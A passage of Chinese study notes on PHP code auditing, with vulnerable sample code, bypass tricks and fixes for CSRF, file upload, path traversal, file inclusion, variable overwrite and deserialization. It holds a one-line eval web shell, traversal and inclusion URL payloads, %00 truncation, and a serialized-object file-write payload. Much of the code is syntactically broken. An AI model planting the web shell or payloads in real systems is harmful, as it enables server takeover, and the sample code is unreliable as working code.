<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"illegal"</span>);</span><br><span class="line">&#125; </span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"conn.php"</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE usename="</span>$usename<span class="string">" and password="</span>$usename<span class="string">";</span></span><br><span class="line"><span class="string">$result = mysql_query($sql) or die("</span>fail<span class="string">",mysql_error());</span></span><br><span class="line"><span class="string">if($row = mysql_fetch_array($result))&#123;</span></span><br><span class="line"><span class="string">	session_start();</span></span><br><span class="line"><span class="string">	$_SESSION['usename']=$row['usename'];</span></span><br><span class="line"><span class="string">	echo $_SESSION['usename']."</span> welcome!<span class="string">";</span></span><br><span class="line"><span class="string">	echo '&lt;a href="</span>register<span class="string">"&gt;添加用户&lt;/a&gt;'</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span></span></span><br><span class="line">              &lt;title&gt;会员注册&lt;/head&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> =<span class="string">"register.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            注册用户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"usename"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点用户添加"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset-utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'usename'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>请登录用户<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'usename'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>)</span><br><span class="line">$sql = <span class="string">"INSERT INTO admin(username,password) VALUES($usename,$password)"</span>;</span><br><span class="line"><span class="keyword">if</span>($res_insert)&#123;</span><br><span class="line">	<span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>fail<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"&lt;script&gt;alert("</span>success<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录后才能注册，抓包，生成CSRF，保存，发给管理员，（管理员是已登录状态，所以可以注册），管理员点击，带着自己的cookie，成功的注册了一个你想要的账号。</p>
<p>修复方案：</p>
<p>验证码</p>
<p>添加Referer验证        页面逻辑</p>
<p>添加Token验证（放入cookie中）        真随机算法生成器，以致攻击者无法构造完整的url，</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>用户上传一个可执行的脚本文件，并通过此脚本文件获得了执行服务器命令的能力。问题在于服务器怎么处理、解释文件。</p>
<p>漏洞条件：</p>
<p>文件可上传</p>
<p>文件上传路径</p>
<p>文件可被访问、执行</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563348454917.png" alt="1563348454917"></p>
<p>挖掘思路：</p>
<p>上传调用同一个上传类，直接全局搜索上传函数</p>
<p>黑盒寻找上传点，代码定位</p>
<p>代码案例</p>
<p>name：客户端的原始上传文件名称</p>
<p>Type： 上传文件的MIME类型</p>
<p>Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
<p>Error：上传文件时的错误信息</p>
<p>Size：上传文件的大小，单位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset-utf-8&quot;);</span><br><span class="line">$upload_dir = &quot;E:\Local test\WWW\upload&quot;;</span><br><span class="line">if(!isset($_FILES[&apos;file&apos;])&#123;</span><br><span class="line">    $upload_name = $upload_dir.&quot;\\&quot;.$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">    move_upload_file($_FILES[&apos;file&apos;][&apos;temp_name&apos;]，$upload_name);</span><br><span class="line">    echo &quot;Type: &quot;.$_FILE[&apos;file&apos;][&apos;type&apos;].&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;Size: &quot;.($_FILE[&apos;file&apos;][&apos;size&apos;]/1024).&quot;&lt;br &gt;&quot;;</span><br><span class="line">    echo &quot;name: &quot;.($_FILE[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;fail&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;</span><br><span class="line">              &lt;title&gt;Tilte&lt;/head&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">        &lt;form action =&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br /&gt;</span><br><span class="line">            &lt;input type =&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot;name=&quot;4096&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'c'</span>]);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>文件上传绕过-客户端</p>
<p>1.将form表单中的onsubmit事件删除</p>
<p>2.拦截数据包，修改拓展名</p>
<p>文件上传绕过-服务端</p>
<p>1.黑白名单过滤</p>
<p>2.修改MIME乐行</p>
<p>3.截断上传攻击</p>
<p>4..htaccess文件攻击</p>
<p>5.目录验证</p>
<p>修复方案</p>
<p>1.检测文件上传内容，黑白名单验证，检测文件拓展名</p>
<p>​                                    MIME验证，检测文件的MIME类型</p>
<p>2.限制文件大小</p>
<p>3.更改临时文件夹的路径</p>
<p>4.读取上传文件的绝对路径与文件名称  过滤./    ../， 目录穿越</p>
<p>5.隐藏文件路径，文件名随机</p>
<h3 id="目录穿越以及文件包含"><a href="#目录穿越以及文件包含" class="headerlink" title="目录穿越以及文件包含"></a>目录穿越以及文件包含</h3><p>文件操作漏洞    </p>
<ol>
<li>文件上传</li>
<li>目录穿越</li>
<li>文件包含</li>
<li>文件读取</li>
<li>文件下载以及删除</li>
</ol>
<p>目录穿越：在Web应用程序所在的根目录以外的文件夹上，任意的存取被限制的文件夹、执行命令或查找数据，目录穿越攻击。</p>
<p>代码案例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    readfile(<span class="string">"file/"</span>.$_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>?file=<span class="number">1</span>.txt</span><br><span class="line"><span class="meta">&gt;&gt;</span>?file=../<span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p>绕过方式</p>
<p>URL编码，16位Unicode编码，双倍URL编码，超长UTF-8 Unicode编码</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563354832317.png" alt="1563354832317"></p>
<p>修复方案：</p>
<ol>
<li>在URL内不要使用文件名作为参数</li>
<li>检查文件名是否有..</li>
<li>在php.ini文件中设置open_basedir来制定文件的目录</li>
<li>使用realpath函数来展开文件路劲中的”./“,”../“等字符，然后返回绝对路径名称</li>
<li>使用basename函数来返回不包含路径的文件名称</li>
</ol>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>由于传入的文件名没有经过合理的校验，导致意外的文件泄露甚至代码注入</p>
<p>危害</p>
<p>执行恶意代码</p>
<p>包含恶意文件控制网站、网站服务器</p>
<p>本地包含    LFI</p>
<p>包含本机文件，该漏洞允许攻击者操纵输入数据、注入路径遍历字符。包含web服务器的其他文件</p>
<p>远程包含    RFI</p>
<p>远程文件包含需要设置allow_url_include =On 四个文件都支持HTTP、FTP等协议，</p>
<p>挖掘思路</p>
<p>模块加载、cache调用，传入的参数拼接包含路径</p>
<p>include()</p>
<p>include_once()</p>
<p>require()</p>
<p>require_once()</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563355377723.png" alt="1563355377723"></p>
<p>本地文件包含</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=../<span class="built_in">file</span>/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>远程文件包含</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>?file=<span class="symbol">http:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/phpinfo.php</span><br><span class="line">此url也可用于菜刀连接</span><br></pre></td></tr></table></figure>

<p>文件名拓展名被写死，可以用%00截断，（1.jpg%00.php）</p>
<p>远程包含利用方式</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563356062805.png" alt="1563356062805"></p>
<p>修复方案</p>
<p>关闭远程包含参数开关</p>
<p>allow_url_include =Off</p>
<p>设置类似白名单的方法，筛选固定文件名</p>
<p>常见目录穿越字符进行过滤，若”./“,”../“,”..&quot;</p>
<p>觉着还可以过滤一下 %00 这个危险截断符    （但是\x00的截断在php&gt;5.3.4就没用了，）</p>
<h3 id="任意文件读取以及删除（修改）"><a href="#任意文件读取以及删除（修改）" class="headerlink" title="任意文件读取以及删除（修改）"></a>任意文件读取以及删除（修改）</h3><p>正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563367306026.png" alt="1563367306026"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($filename))&#123;</span><br><span class="line"><span class="number">1.</span>  readfile($filename);		<span class="comment">//目录穿越一波？</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>  $fp = fopen($filename,mode=<span class="string">'r'</span>) <span class="keyword">or</span> (<span class="string">"fail"</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;					<span class="comment">//感觉跟文件包含差不多23333,文件包含是利用，文件读取就读内容</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>  <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者可以将路劲遍历序列放入文件名内，从当前位置向上回溯，从而浏览整个浏览器的任何文件</p>
<p>任意文件删除</p>
<p>unlink()函数</p>
<p>同任意文件读取，函数不同而已。</p>
<p>修复方案：</p>
<ol>
<li><p>正则严格判断用户输入参数的格式</p>
</li>
<li><p>检查使用者的文件名是否有“..”的目录阶层字符</p>
</li>
<li><p>在php.ini文件中设置open_basedir来限定文件访问的范围</p>
</li>
</ol>
<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>结合其他漏洞攻击，覆盖白名单，控制没覆盖的未初始化变量导致SQL</p>
<p>常见危险函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">extract</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">parse_str</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">import_request_variables</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>常见的遍历方式释放代码可能导致变量覆盖漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value)&#123;</span><br><span class="line">		$$_key = addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>前提：register_globals = Off，（？为啥这么要求嘞，待解决）</p>
<p>extract()变量覆盖</p>
<p>int extract($array,extract_rules,prefix)</p>
<p>$array 关联的数组，受后面参数影响</p>
<p>extract_rules 对待非法/数字和冲突的键名的方法将根据取除标记</p>
<p>prefix 仅在第二个参数特殊时需要，添加前缀</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563369370804.png" alt="1563369370804"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract函数用来将一个数字分解成多个变量直接使用，下面是W3C的解释：PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。第二个参数<span class="built_in"> type </span>用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。本函数返回成功设置的变量数目。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">'pwd'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'username'</span>=&gt;<span class="string">'username'</span>,</span><br><span class="line">	<span class="string">'password'</span>=&gt;<span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'rand'</span> =&gt; <span class="string">'rand'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">extract($arr,EXTR_PREFIX_SAME,<span class="string">"pwd"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$usename,$password,$rant"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">","</span>.$pwd_password;  </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>“EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。”</strong></p>
<p>EXTR_IF_EXISTS 似乎同上</p>
<p>parse_str()变量覆盖</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> parse_str(<span class="built_in">string</span> $encoded_string<span class="meta">[</span>,<span class="built_in">array</span> $result<span class="meta">]</span>)</span><br></pre></td></tr></table></figure>

<p>$encoded_string 输入的字符串</p>
<p>$result 变量将以数组元素的形式存入到这个数组，作为替代</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个很暴力</span><br><span class="line">$a = b</span><br><span class="line">parse_str($a = <span class="string">'n'</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>

<p>import_request_variables()</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variable(<span class="built_in">string</span> $type[,<span class="built_in">string</span> $prefix])</span><br></pre></td></tr></table></figure>

<p>$type 指定需要导入的变量，可用字母G,P,C代表GET POST COOKIE</p>
<p>$prefix    变量名前缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'0'</span>;</span><br><span class="line">import_request_varibles(<span class="string">'G'</span>);	<span class="comment">//相当于开启全局变量注册</span></span><br><span class="line"><span class="keyword">if</span>($a = <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;?a=<span class="number">1</span>             <span class="comment">#变量覆盖成功</span></span><br></pre></td></tr></table></figure>

<p>修复方案</p>
<ol>
<li>在php.ini文件设置register_globals=Off</li>
<li>使用原始变量数组，如$_POST,$_GET等数组变量进行操作</li>
<li>不使用foreach语句来遍历$_GET变量，而改用[(index)]来制定  （？还是不懂，觉得上面的案例是$$的，待解决）</li>
<li>注册变量前先判断变量是否存在，（就是不用extract这个函数了呗）</li>
</ol>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>序列化：把对象转换为字节序列的过程，成为对象的序列化</p>
<p>反序列化：把字节序列恢复为对象的过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test1=<span class="string">"SQYY 1028"</span>;</span><br><span class="line">$test2=<span class="keyword">array</span>(<span class="string">"SQYY"</span>,<span class="number">1028</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($test1);			&gt;s:<span class="number">9</span>:<span class="string">"SQYY 1028"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($test2);			&gt;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"SQYY"</span>;i:<span class="number">1</span>;i:<span class="number">1028</span>;&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>漏洞成因</p>
<p>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，</p>
<p>漏洞根据不同的代码可以导致各种攻击，如代码注入，SQL注入、目录遍历等等</p>
<p>序列化的不同结果：1. public 2. private 3. protect</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">"sqyy 2018"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line">&gt;</span><br><span class="line">    </span><br><span class="line">&gt;O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">"testtest1"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;s:<span class="number">8</span>:<span class="string">"*test3"</span>;s:<span class="number">9</span>:<span class="string">"sqyy 2018"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞本质</p>
<p>unserialize函数的变量可控</p>
<p>php文件中存在可利用类，类中有魔术方法</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563373599421.png" alt="1563373599421"></p>
<p>导致代码执行的漏洞( __destruct() )</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct<span class="comment">()</span> 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a = <span class="string">'test'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fp = fopen(<span class="string">"E:\\Local Test\www\hello.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">        fputs($fp,<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line">$obj = unserialize($_POST[<span class="string">'obj'</span>]);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"E:\\Local Test\www\hello.php"</span>;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">post:</span>obj=<span class="string">O:</span><span class="number">1</span>:<span class="string">"A"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">1</span>:<span class="string">"a"</span>;<span class="string">s:</span><span class="number">18</span>:<span class="string">"&lt;?php&gt; phpinfo();?&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>因为反序列化obj时，执行了魔术方法，__destruct(),从而引发了文件写入；</p>
<p>漏洞成因，存在魔术方法，魔术方法中的a可控，</p>
<p>防御思路：不用魔术方法，或者使得魔术方法中的变量、代码 用户不可控。</p>
<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>标准类型：布尔、整型、浮点、字符串</p>
<p>复杂类型：数组、对象</p>
<p>特殊类型：资源 resource</p>
<ol>
<li><p>字符串和数字比较：字符串第一个不为数字前的数字为字符串的值</p>
</li>
<li><p>数字、字符串 和 数组比较，永假</p>
</li>
<li><p>科学计数法的比较，同第一条</p>
